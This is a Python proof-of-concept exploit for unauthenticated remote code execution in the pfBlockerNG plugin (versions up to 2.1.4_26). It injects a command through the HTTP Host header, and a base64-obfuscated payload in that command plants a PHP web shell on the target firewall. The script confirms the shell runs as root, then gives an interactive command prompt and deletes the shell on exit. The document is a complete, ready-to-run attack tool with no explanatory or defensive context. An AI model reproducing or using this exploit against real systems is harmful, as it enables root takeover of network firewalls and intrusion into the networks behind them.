# !/usr/bin/env python3
import argparse
import requests
import time
import sys
import urllib.parse
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

parser = argparse.ArgumentParser(description="pfBlockerNG <= 2.1.4_26 Unauth RCE")
parser.add_argument('--url', action='store', dest='url', required=True,
                    help="Full URL and port e.g.: https://192.168.1.111:443/")
args = parser.parse_args()

url = args.url
shell_filename = "system_advanced_control.php"


def check_endpoint(url):
    response = requests.get('%s/pfblockerng/www/index.php' % (url), verify=False)
    if response.status_code == 200:
        print("[+] pfBlockerNG is installed")
    else:
        print("\n[-] pfBlockerNG not installed")
        sys.exit()


def upload_shell(url, shell_filename):
    payload = {
        "Host": "' *; echo 'PD8kYT1mb3BlbigiL3Vzci9sb2NhbC93d3cvc3lzdGVtX2FkdmFuY2VkX2NvbnRyb2wucGhwIiwidyIpIG9yIGRpZSgpOyR0PSc8P3BocCBwcmludChwYXNzdGhydSggJF9HRVRbImMiXSkpOz8+Jztmd3JpdGUoJGEsJHQpO2ZjbG9zZSggJGEpOz8+'|python3.8 -m base64 -d | php; '"}
    print("[/] Uploading shell...")
    response = requests.get('%s/pfblockerng/www/index.php' % (url), headers=payload, verify=False)
    time.sleep(2)
    response = requests.get('%s/system_advanced_control.php?c=id' % (url), verify=False)
    if ('uid=0(root) gid=0(wheel)' in str(response.content, 'utf-8')):
        print("[+] Upload succeeded")
    else:
        print("\n[-] Error uploading shell. Probably patched ", response.content)
        sys.exit()


def interactive_shell(url, shell_filename, cmd):
    response = requests.get('%s/system_advanced_control.php?c=%s' % (url, urllib.parse.quote(cmd, safe='')),
                            verify=False)
    print(str(response.text) + "\n")


def delete_shell(url, shell_filename):
    delcmd = "rm /usr/local/www/system_advanced_control.php"
    response = requests.get('%s/system_advanced_control.php?c=%s' % (url, urllib.parse.quote(delcmd, safe='')),
                            verify=False)
    print("\n[+] Shell deleted")


check_endpoint(url)
upload_shell(url, shell_filename)
try:
    while True:
        cmd = input("# ")
        interactive_shell(url, shell_filename, cmd)
except:
    delete_shell(url, shell_filename)
